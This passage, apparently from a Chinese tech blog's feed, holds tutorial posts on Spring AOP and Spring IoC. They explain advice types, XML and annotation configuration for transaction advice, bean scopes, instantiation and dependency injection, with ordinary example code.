是通知应用到目标对象之后被动态创建的对象。</p><p>❽<strong>织人</strong></p><p>织入( Weaving)是将切面代码插入到目标对象上，从而生成代理对象的过程。根据不同的实现技术，AOP 织入有3种方式:编译期织入，需要有特殊的Java 编译器;类装载期织入，需要有特殊的类装载器:动态代理织入，在运行期为目标类添加通知生成子类的方式。Spring AOP框架默认采用动态代理织入，而AspectJ (基于Java语言的AOP框架)</p><p><strong><a herf="https://blog.csdn.net/qq_42009262/article/details/105013992">Spring通知类型介绍</strong></p><p>根据Spring中通知在目标类方法的链接点位置，可以分为6种类型：</p><p><strong>（1）环绕通知：</strong></p><table><thead><tr><th align="center">实现接口</th><th align="right">功能描述</th></tr></thead><tbody><tr><td align="center">org.aopalliance.itercept.MethodInterceptor</td><td align="right">在目标方法执行前和执行后实施增强。可以用于日志记录、事务处理等功能。</td></tr></tbody></table><p><strong>（2）前置通知：</strong></p><table><thead><tr><th align="center">实现接口</th><th align="right">功能描述</th></tr></thead><tbody><tr><td align="center">org.springframework.aop.MethodBeforeAdvice</td><td align="right">在目标方法执行前实施增强。可以用于权限管理等功能。</td></tr></tbody></table><p><strong>（3）后置返回通知</strong>：</p><table><thead><tr><th align="center">实现接口</th><th align="right">功能描述</th></tr></thead><tbody><tr><td align="center">org.springframework.aop.AfterReturningAdvice</td><td align="right">在目标方法成功执行后实施增强。可以用于关闭流、删除临时文件等功能。</td></tr></tbody></table><p><strong>（4）后置（最终）通知：</strong></p><table><thead><tr><th align="center">实现接口</th><th align="right">功能描述</th></tr></thead><tbody><tr><td align="center">org.springframework.aop.AfterAdvice</td><td align="right">在目标方法执行后实施增强。与后置返回通知不同的是，不管是否发生异常都要执行该通知，可应用于释放资源。</td></tr></tbody></table><p><strong>（5）异常通知：</strong></p><table><thead><tr><th align="center">实现接口</th><th align="right">功能描述</th></tr></thead><tbody><tr><td align="center">org.springframework.aop.ThrowsAdvice</td><td align="right">在方法抛出异常后实施增强。可以用于异常处理、记录日志等功能。</td></tr></tbody></table><p><strong>（6）引入通知：</strong></p><table><thead><tr><th align="center">实现接口</th><th align="right">功能描述</th></tr></thead><tbody><tr><td align="center">org.springframework.aop.IntroductInterceptor</td><td align="right">在目标类中添加一些新的方法和属性。可以用于修改目标类（增强类）。</td></tr></tbody></table><h2 id="3-4-基于XML配置开发"><a href="#3-4-基于XML配置开发" class="headerlink" title="3.4.基于XML配置开发"></a>3.4.基于XML配置开发</h2><p><strong>1.把通知类用 bean 标签配置起来</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;!-- 配置通知 --&gt;<br> &lt;bean id=<span class="hljs-string">&quot;txManager&quot;</span> class=<span class="hljs-string">&quot;com.itheima.utils.TransactionManager&quot;</span>&gt; <br>&lt;property name=<span class="hljs-string">&quot;dbAssit&quot;</span> ref=<span class="hljs-string">&quot;dbAssit&quot;</span>&gt;&lt;/property&gt;<br>&lt;/bean&gt;<br></code></pre></td></tr></table></figure><p><strong>2.使用 aop:config 声明 aop 配置</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">作用：用于声明开始 aop 的配置<br>&lt;aop:config&gt;<br>&lt;!-- 配置的代码都写在此处 --&gt;<br>&lt;/aop:config&gt;<br></code></pre></td></tr></table></figure><p><strong>3.使用 aop:aspect 配置切面</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">aop:aspect:<br>作用：<br>用于配置切面。<br>属性：<br>id：给切面提供一个唯一标识。<br>ref：引用配置好的通知类 bean 的 id。<br> &lt;aop:aspect id=<span class="hljs-string">&quot;txAdvice&quot;</span> ref=<span class="hljs-string">&quot;txManager&quot;</span>&gt;<br>&lt;!--配置通知的类型要写在此处--&gt;<br>&lt;/aop:aspect&gt;<br></code></pre></td></tr></table></figure><p><strong>4.使用 aop:pointcut 配置切入点表达式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">aop:pointcut：<br>作用：<br>用于配置切入点表达式。就是指定对哪些类的哪些方法进行增强。<br>属性：<br>expression：用于定义切入点表达式。<br>id：用于给切入点表达式提供一个唯一标识<br>&lt;aop:pointcut id=<span class="hljs-string">&quot;pt1&quot;</span> expression=<span class="hljs-string">&quot;execution(</span><br><span class="hljs-string">execution:匹配方法的执行(常用)</span><br><span class="hljs-string">execution(表达式)</span><br><span class="hljs-string">表达式语法：execution([修饰符] 返回值类型 包名.类名.方法名(参数))&quot;</span> /&gt;<br></code></pre></td></tr></table></figure><p><strong>5.使用 aop:xxx 配置对应的通知类型</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">aop:before<br>作用：<br>用于配置前置通知。指定增强的方法在切入点方法之前执行<br>属性：<br>method:用于指定通知类中的增强方法名称<br>ponitcut-ref：用于指定切入点的表达式的引用<br>poinitcut：用于指定切入点表达式<br>执行时间点：<br>切入点方法执行之前执行<br>&lt;aop:before method=<span class="hljs-string">&quot;beginTransaction&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pt1&quot;</span>/&gt;<br>aop:after-returning<br>作用：<br>用于配置后置通知<br>属性：<br>method：指定通知中方法的名称。<br>pointct：定义切入点表达式<br>pointcut-ref：指定切入点表达式的引用<br>执行时间点：<br>切入点方法正常执行之后。它和异常通知只能有一个执行<br>&lt;aop:after-returning method=<span class="hljs-string">&quot;commit&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pt1&quot;</span>/&gt;<br>aop:after-throwing<br>作用：<br>用于配置异常通知<br>属性：<br>method：指定通知中方法的名称。<br>pointct：定义切入点表达式<br>pointcut-ref：指定切入点表达式的引用<br>执行时间点：<br>切入点方法执行产生异常后执行。它和后置通知只能执行一个<br>&lt;aop:after-throwing method=<span class="hljs-string">&quot;rollback&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pt1&quot;</span>/&gt;<br>aop:after<br>作用：<br>用于配置最终通知<br>属性：<br>method：指定通知中方法的名称。<br>pointct：定义切入点表达式<br>pointcut-ref：指定切入点表达式的引用<br>执行时间点：<br>无论切入点方法执行时是否有异常，它都会在其后面执行。<br>&lt;aop:after method=<span class="hljs-string">&quot;release&quot;</span> pointcut-ref=<span class="hljs-string">&quot;pt1&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><h2 id="3-5-基于注解开发"><a href="#3-5-基于注解开发" class="headerlink" title="3.5.基于注解开发"></a>3.5.基于注解开发</h2><p><strong>1.配置类的编写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-meta">@ComponentScan(basePackages=&quot;包名&quot;)</span><br><span class="hljs-meta">@EnableAspectJAutoProxy</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringConfiguration</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>2.通知类的编写</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component(&quot;txManager&quot;)</span><br><span class="hljs-meta">@Aspect</span><span class="hljs-comment">//表明当前类是一个切面类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionManager</span> &#123;<br><span class="hljs-comment">//定义一个 DBAssit</span><br><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> DBAssit dbAssit ;<br> &#125;<br></code></pre></td></tr></table></figure><p><strong>3.在增强的方法上使用注解配置通知</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Before</span><br>作用：<br>把当前方法看成是前置通知。<br>属性：<br>value：用于指定切入点表达式，还可以指定切入点表达式的引用。<br><span class="hljs-comment">//开启事务</span><br><span class="hljs-meta">@Before(&quot;execution(* com.itheima.service.impl.*.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">beginTransaction</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>dbAssit.getCurrentConnection().setAutoCommit(<span class="hljs-literal">false</span>);<br>&#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>e.printStackTrace();<br>&#125; <br>&#125;<br><span class="hljs-meta">@AfterReturning</span><br>作用：<br>把当前方法看成是后置通知。<br>属性：<br>value：用于指定切入点表达式，还可以指定切入点表达式的引用<br><span class="hljs-comment">//提交事务</span><br><span class="hljs-meta">@AfterReturning(&quot;execution(* com.itheima.service.impl.*.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">commit</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>dbAssit.getCurrentConnection().commit();<br>&#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>e.printStackTrace();<br>&#125; &#125;<br><span class="hljs-meta">@AfterThrowing</span><br>作用：<br>把当前方法看成是异常通知。<br>属性：<br>value：用于指定切入点表达式，还可以指定切入点表达式的引用<br><span class="hljs-comment">//回滚事务</span><br><span class="hljs-meta">@AfterThrowing(&quot;execution(* com.itheima.service.impl.*.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rollback</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>dbAssit.getCurrentConnection().rollback();<br>&#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>e.printStackTrace();<br>&#125; &#125;<br><span class="hljs-meta">@After</span><br>作用：<br>把当前方法看成是最终通知。<br>属性：<br>value：用于指定切入点表达式，还可以指定切入点表达式的引用<br><span class="hljs-comment">//释放资源</span><br><span class="hljs-meta">@After(&quot;execution(* com.itheima.service.impl.*.*(..))&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>dbAssit.releaseConnection();<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br> &#125;<br> <span class="hljs-meta">@Around</span><br>作用：<br>把当前方法看成是环绕通知。<br>属性：<br>value：用于指定切入点表达式，还可以指定切入点表达式的引用。<br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 环绕通知</span><br><span class="hljs-comment">* <span class="hljs-doctag">@param</span> pjp</span><br><span class="hljs-comment">* <span class="hljs-doctag">@return</span></span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">@Pointcut</span><br>作用：<br>指定切入点表达式<br>属性：<br>value：指定表达式的内容<br><span class="hljs-meta">@Pointcut(&quot;execution(* com.itheima.service.impl.*.*(..))&quot;)</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pt1</span><span class="hljs-params">()</span> &#123;&#125;<br><span class="hljs-meta">@Around(&quot;pt1()&quot;)</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transactionAround</span><span class="hljs-params">(ProceedingJoinPoint pjp)</span> &#123;<br><span class="hljs-comment">//定义返回值</span><br><span class="hljs-type">Object</span> <span class="hljs-variable">rtValue</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-comment">//获取方法执行所需的参数</span><br>Object[] args = pjp.getArgs();<br><span class="hljs-comment">//前置通知：开启事务</span><br>beginTransaction();<br><span class="hljs-comment">//执行方法</span><br>rtValue = pjp.proceed(args);<br><span class="hljs-comment">//后置通知：提交事务</span><br>commit();<br>&#125;<span class="hljs-keyword">catch</span>(Throwable e) &#123;<br><span class="hljs-comment">//异常通知：回滚事务</span><br>rollback();<br>e.printStackTrace();<br>&#125;<span class="hljs-keyword">finally</span> &#123;<br><span class="hljs-comment">//最终通知：释放资源</span><br>release();<br>&#125;<br><span class="hljs-keyword">return</span> rtValue;<br> &#125;<br></code></pre></td></tr></table></figure><p><strong>参考文献：[1] 陈恒，楼偶俊，张立杰.Java EE框架整和开发入门到实践[M].清华大学出版社，2018-：.39-45</strong><br><strong>案例来自于黑马程序员Spring教学</strong></p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>java</tag>
      
      <tag>spring</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于Spring框架的总结(二、Spring IoC)</title>
    <link href="/2022/09/22/%E5%85%B3%E4%BA%8ESpring%E6%A1%86%E6%9E%B6%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%88%E4%BA%8C%E3%80%81Spring-IoC/"/>
    <url>/2022/09/22/%E5%85%B3%E4%BA%8ESpring%E6%A1%86%E6%9E%B6%E7%9A%84%E6%80%BB%E7%BB%93%EF%BC%88%E4%BA%8C%E3%80%81Spring-IoC/</url>
    
    <content type="html"><![CDATA[<p>﻿# 关于Spring框架的总结（二、Spring IoC）</p><h2 id="2-Spring-IoC"><a href="#2-Spring-IoC" class="headerlink" title="2.Spring IoC"></a>2.Spring IoC</h2><blockquote><p>Spring IoC<br>2.1.Spring IoC的基本概念<br>2.2.Spring IoC容器<br>2.3.Spring IoC中的bean标签<br>2.4.依赖注入</p></blockquote><h2 id="2-1-Spring-IoC的基本概念"><a href="#2-1-Spring-IoC的基本概念" class="headerlink" title="2.1.Spring IoC的基本概念"></a><strong>2.1.Spring IoC的基本概念</strong></h2><p>控制反转(Inversion of Control, IoC)是一个比较抽象的概念，是Spring框架的核心，用来消减计算机程序的精合问题。<font color=red>对于spring框架来说，就是由spring来负责控制对象的生命周期和对象间的关系。</font >依赖注入(Dpendency Injection,DI)是IOC的另一种说法，只是换了种角度来描述相同的概念，下面举一个例子来解释IOC和DI。</p><p>当人们需要一件东西时， 第一反应就是找东西， 例如想吃面包。在没有面包店和有面包店两种情况下，您会怎么做?在没有面包店时，最直观的做法可能是您按照自己的口味制作面包，也就是一个面包需要主动制作。然而时至今日，各种网店、实体店盛行，已经没有必要自己制作面包。想吃面包了，去网店或实体店把自己的口味告诉店家，一会就可以吃到面包了。注意，您并没有制作面包，而是由店家制作，但是完全符合您的口味。</p><p>上面只是列举了一个非常简单的例子，但包含了控制反转的思想，即把制作面包等主动权交给店家。下面通过面向对象编程思想继续探讨这两个概念<p>当某个Java对象(调用者，例如您)需要调用另一个Java 对象(被调用者，即被依赖对象，例如面包)时，在传统编程模式下，调用者通常会采用“new被调用者”的代码方式来创建对象(例如您自已制作面包)。这种方式会增加调用者与被调用者之间的耦合性，不利于后期代码的升级与维护。</p><p><font color=red>当Spring框架出现后，对象的实例不再由调用者来创建，而是由Spring容器(例如面包店)来创建。Spring容器会负责控制程序之间的关系(例如面包店负责控制您与面包的关系)，而不是由调用者的程序代码直接控制。这样，控制权由调用者转移到Spring容器，控制权发生了反转，这就是Spring的控制反转。</p><p>从Spring容器角度来看，Spring容器负责将被依赖对象赋值给调用者的成员变量，相当于为调用者注入它所依赖的实例，这就是Spring的依赖注入。</p><p>综上所述，控制反转是种通过描述 (在 Spring中可以是XML或注解)并通过第三方去产生或获取特定对象的方式。在Spring中实现控制反转的是loC容器，其实现方法是依赖注入。</p><h2 id="2-2-Spring-IoC容器"><a href="#2-2-Spring-IoC容器" class="headerlink" title="2.2.Spring IoC容器"></a><strong>2.2.Spring IoC容器</strong></h2><p><strong>1.Spring IoC容器设计主要是基于BeanFactoty和ApplicationContext两个接口。下图为spring工厂的类结构体</strong><br><img src="https://img-blog.csdnimg.cn/20200712110712194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMDA5MjYy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>BeanFactory 是 Spring 容器中的顶层接口，ApplicationContext 是它的子接口。</p><p><strong>2.BeanFactory 和 ApplicationContext 的区别</strong><br>BeanFactory 和 ApplicationContext 的区别：<br>创建对象的时间点不一样：</p><ul><li>（1.）BeanFactory：什么使用什么时候创建对象。</li><li>（2.）ApplicationContext：只要一读取配置文件，默认情况下就会创建对象。</li></ul><p><strong>3.ApplicationContext 接口的实现类</strong></p><ul><li>3.1ClassPathXmlApplicationContext：从类的根路径(src根目录)寻找指定的XML配置文件 ，最常使用。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//初始化Spring容器ApplicationContext ，加载配置文件</span><br>ApplicationContext applicationContext=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPathXMLApplicationContext</span>（“ApplicationContext.xml”）<br></code></pre></td></tr></table></figure><ul><li>3.2FileSystemXmlApplicationContext：从磁盘的绝对路径中寻找指定的XML配置文件，配置文件可以在磁盘的任意位置（限制比较大，如果换了设备或者文件xml配置位置改变将找不到配置文件，不推荐）。</li></ul>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//初始化Spring容器ApplicationContext ，加载配置文件</span><br>ApplicationContext applicationContext=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemXmlApplicationContext</span>（“D:\文件位置\src\ApplicationContext.xml”）<br></code></pre></td></tr></table></figure><ul><li>3.3AnnotationConfigApplicationContext:使用注解配置容器对象时，需要使用此类来创建 spring 容器。用来读取注解。  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//初始化Spring容器ApplicationContext ，加载配置文件</span><br>ApplicationContext applicationContext=<span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>（“注解配置类.class”）<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-3-Spring-IoC中的bean标签"><a href="#2-3-Spring-IoC中的bean标签" class="headerlink" title="2.3.Spring IoC中的bean标签"></a><strong>2.3.Spring IoC中的bean标签</strong></h2><p><strong>1.<code>&lt;bean&gt;</code>元素的常用属性及其子元素</strong></p><table><thead><tr><th>属性或子元素名称</th><th>描述</th></tr></thead><tbody><tr><td>id</td><td>Bean在BeanFactory中的唯一标识，在代码中通过BeanFactory获取Bean实例时需要以此作为索引名称</td></tr><tr><td>class</td><td>Bean的具体实现类，使用类的名</td></tr><tr><td>scope</td><td>指定Bean实例的作用域，具体属性值及含义</td></tr><tr><td><code>&lt;constructor-arg&gt;</code></td><td><code>&lt;bean&gt;</code>元素的子元素，使用构造方法注入，指定构造方法的参数。该元素的index属性指定参数的序号，ref属性指定对BeanFactory中其他Bean的引用关系，type属性指定参数类型，value属性指定参数的常量值</td></tr><tr><td><code>&lt;property&gt;</code></td><td><code>&lt;bean&gt;</code>元素的子元素，用于设置一个属性。该元素的name属性指定Bean实例中相应的属性名称，value 属性指定Bean的属性值，ref 属性指定属性对BeanFactory中其他Bean的引用关系</td></tr><tr><td><code>&lt;list&gt;</code></td><td><code>&lt;property&gt;</code>元素的子元素，用于封装List 或数组类型的依赖注入</td></tr><tr><td><code>&lt;map&gt;</code></td><td><code>&lt;property&gt;</code>元素的子元素，用于封装Map类型的依赖注入</td></tr><tr><td><code>&lt;set&gt;</code></td><td><code>&lt;property&gt;</code>元素的子元素，用于封装Set类型的依赖注入</td></tr><tr><td><code>&lt;entry&gt;</code></td><td><code>&lt;map&gt;</code>元素的子元素，用于设置一个键值对</td></tr></tbody></table><p><strong>2.bean 的作用范围和生命周期</strong><br>scope：指定对象的作用范围。</p><ul><li><font color=red>singleton :默认值，单例的.</li><li><font color=red> prototype :多例的.</li><li>request :WEB 项目中,Spring 创建一个 Bean 的对象,将对象存入到 request 域中.</li><li>session :WEB 项目中,Spring 创建一个 Bean 的对象,将对象存入到 session 域中.</li><li>global session :WEB 项目中,应用在 Portlet 环境.如果没有 Portlet 环境那么<br>globalSession 相当于 session.</li></ul><p><font color=red>单例对象：scope&#x3D;”singleton”</font><br>一个应用只有一个对象的实例。它的作用范围就是整个引用。<br>生命周期：</p><ul><li>对象出生：当应用加载，创建容器时，对象就被创建了。</li><li>对象活着：只要容器在，对象一直活着。</li><li>对象死亡：当应用卸载，销毁容器时，对象就被销毁了。</li></ul><p><font color=red>多例对象：scope&#x3D;”prototype”</font><br>每次访问对象时，都会重新创建对象实例。<br>生命周期：</p><ul><li>对象出生：当使用对象时，创建新的对象实例。</li><li>对象活着：只要对象在使用中，就一直活着。</li><li>对象死亡：当对象长时间不用时，被 java 的垃圾回收器回收了。</li></ul><p><strong>3.bean的实例化</strong></p><ul><li><p>第一种方式：使用默认无参构造函数</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;bean id=<span class="hljs-string">&quot;类名&quot;</span> class=<span class="hljs-string">&quot;类位置&quot;</span>/&gt;<br></code></pre></td></tr></table></figure></li><li><p>第二种方式：spring 管理静态工厂-使用静态工厂的方法创建对象</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 模拟一个静态工厂，创建业务层实现类</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticFactory</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IAccountService <span class="hljs-title function_">createAccountService</span><span class="hljs-params">()</span>&#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AccountServiceImpl</span>();<br>&#125; &#125;<br>&lt;!-- 此种方式是:使用 StaticFactory 类中的静态方法 createAccountService 创建对象，并存入 spring 容器<br>id 属性：指定 bean 的 id，用于从容器中获取<br>class 属性：指定静态工厂的全限定类名<br>factory-method 属性：指定生产对象的静态方法<br>--&gt;<br> &lt;bean id=<span class="hljs-string">&quot;accountService&quot;</span>   class=<span class="hljs-string">&quot;com.itheima.factory.StaticFactory&quot;</span>   <br>  factory-method=<span class="hljs-string">&quot;createAccountService&quot;</span>&gt;&lt;/bean&gt;<br></code></pre></td></tr></table></figure></li><li><p>第三种方式：spring 管理实例工厂-使用实例工厂的方法创建对象</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 模拟一个实例工厂，创建业务层实现类</span><br><span class="hljs-comment">* 此工厂创建对象，必须现有工厂实例对象，再调用方法</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InstanceFactory</span> &#123;<br><span class="hljs-keyword">public</span> IAccountService <span class="hljs-title function_">createAccountService</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AccountServiceImpl</span>();<br>&#125; &#125;<br>&lt;!-- 此种方式是：<br>先把工厂的创建交给 spring 来管理。<br>然后在使用工厂的 bean 来调用里面的方法<br>factory-bean 属性：用于指定实例工厂 bean 的 id。<br>factory-method 属性：用于指定实例工厂中创建对象的方法。<br>--&gt;<br> &lt;bean id=<span class="hljs-string">&quot;instancFactory&quot;</span> class=<span class="hljs-string">&quot;com.itheima.factory.InstanceFactory&quot;</span>&gt;&lt;/bean&gt;<br>  &lt;bean id=<span class="hljs-string">&quot;accountService&quot;</span>  factory-bean=<span class="hljs-string">&quot;instancFactory&quot;</span><br> factory-method=<span class="hljs-string">&quot;createAccountService&quot;</span>&gt;&lt;/bean&gt;<br></code></pre></td></tr></table></figure></li></ul><h2 id="2-4-依赖注入"><a href="#2-4-依赖注入" class="headerlink" title="2.4.依赖注入"></a><strong>2.4.依赖注入</strong></h2><p><strong>在Spring中实现IoC容器的方法是依赖注入，依赖注入的作用是在使用Spring框架创建对象时动态地将其所依赖的对象(例如属性值)注入Bean组件中。Spring框架的依赖注入通常有两种实现方式，一种是使用构造方法注入，另一种是使用属性的setter方法注入。</strong></p><p><strong>1.使用构造方法注入</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;!-- 使用构造函数的方式，给 service 中的属性传值<br>要求：<br>类中需要提供一个对应参数列表的构造函数。<br>涉及的标签：<br>constructor-arg<br>属性：<br>index:指定参数在构造函数参数列表的索引位置<br>type:指定参数在构造函数中的数据类型<br>name:指定参数在构造函数中的名称 